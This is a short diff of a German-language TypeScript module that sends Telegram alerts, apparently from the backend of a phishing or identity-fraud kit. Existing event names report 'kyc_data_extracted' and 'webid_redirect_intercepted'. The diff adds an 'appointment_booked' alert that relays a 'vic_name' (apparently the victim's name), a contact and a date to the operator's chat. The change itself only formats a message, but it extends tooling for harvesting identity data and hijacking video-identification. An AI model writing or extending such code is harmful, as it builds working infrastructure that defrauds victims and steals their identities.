@@ -13,7 +13,9 @@ export type TelegramEvent =
   | "kyc_data_extracted"
   | "webid_redirect_intercepted"
   | "chat_message_received"
+  | "appointment_booked"
   | "test";
+
 
 interface Payload {
   [k: string]: any;
@@ -145,10 +147,19 @@ function formatMessage(event: TelegramEvent, p: Payload): string {
         `<i>${esc(p.preview || "")}</i>`,
       ].filter(Boolean).join("\n");
 
+    case "appointment_booked":
+      return [
+        `📅 <b>Neuer Termin gebucht</b>`,
+        p.vic_name ? `👤 ${esc(p.vic_name)}` : null,
+        p.contact_name ? `📞 mit ${esc(p.contact_name)}` : null,
+        p.appointment_date ? `🗓 ${esc(p.appointment_date)} um ${esc(p.appointment_time || "")} Uhr` : null,
+      ].filter(Boolean).join("\n");
+
     case "test":
       return `🔔 <b>Test-Nachricht</b>\nDie Telegram-Anbindung funktioniert.`;
   }
 }
+
 
 async function sendToChat(botToken: string, chatId: string, text: string) {
   try {
